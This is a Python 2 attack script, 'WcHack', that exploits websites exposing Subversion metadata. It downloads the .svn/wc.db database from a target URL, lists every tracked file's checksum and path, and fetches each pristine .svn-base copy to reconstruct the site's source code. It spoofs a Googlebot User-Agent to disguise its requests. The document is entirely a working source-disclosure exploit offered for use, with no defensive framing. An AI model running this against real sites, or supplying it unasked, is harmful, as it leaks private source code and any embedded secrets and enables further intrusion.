#!/usr/bin/env python
# -*- encoding: utf-8 -*-
import os
import sqlite3
import urllib2
import argparse

class WcHack:
	def __init__(self,args):
		self.args = args

		if not (self.args.url or self.args.remote) or (self.args.url and self.args.remote) or not self.args.outdir:
			print("Config no enough.\n\r")
			return
		self.path=self.args.outdir
		if not os.path.exists(self.path):
			os.mkdir(self.path)
		print "init over.\n\r"
		if self.args.remote:
			print 'Down wc.db from %s\n\r' % self.args.remote
			with open(self.path + '/wc.db' ,'wb') as f:
				try:
					f.write(self.remote(self.args.remote))
					f.close()
				except urllib2.HTTPError, e:
					print("Please check wc.db url.\n\r")
					return
				except Exception, e:
					print(e+"\n\r")
					return
			print 'Down success.'
			self.data = sqlite3.connect(self.path + '/wc.db')
		elif self.args.file:
			self.data = sqlite3.connect(self.args.file)
		print "Connect wc.db success.\n\r"
		print "Starting download file in wc.db from website.\n\r"
		self.data_sql = self.data.cursor()
		for notes in self.data_sql.execute("select checksum,local_relpath from NODES"):
			self.mkdir(notes[1])
			if not os.path.exists(self.path+notes[1]):
				with open(self.path+notes[1],'wb') as b:
					try:
						hash = notes[0].strip("$sha1$")
						b.write(self.remote('%s/pristine/%s%s/%s.svn-base' % (self.args.url if self.args.url else self.args.remote , hash[0] , hash[1] , hash)))
						print "[Success] File %s down over.\n\r" % notes[1]
					except urllib2.HTTPError, e:
						print "[Error] File %s not exists.\n\r" % notes[1]
		return

	def mkdir(self ,file):
		dir=self.path
		for dclass in os.path.dirname(file).split('/'):
			dir+='/'+dclass
			if not os.path.exists(dir):
				os.mkdir(dir)

	def remote(self,uri):
		r = urllib2.Request(uri, None, {'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)  '})
		return urllib2.urlopen(r).read()


parser = argparse.ArgumentParser()
group = parser.add_mutually_exclusive_group()

parser.add_argument("-v", "--version", help="print WcHack.py version.")
parser.add_argument("-r", "--remote", help="wc.db url example( http://127.0.0.1/.svn/ )", default=0)
parser.add_argument("-u", "--url", help="wc.db down url example( http://127.0.0.1/.svn/ )", default=0)
parser.add_argument("-f", "--file", help="wc.db path example ( /tmp/wc.db )", default=0)
parser.add_argument("-o", "--outdir", help="wc.db save path example ( /tmp/svn/ )")

w = WcHack(parser.parse_args())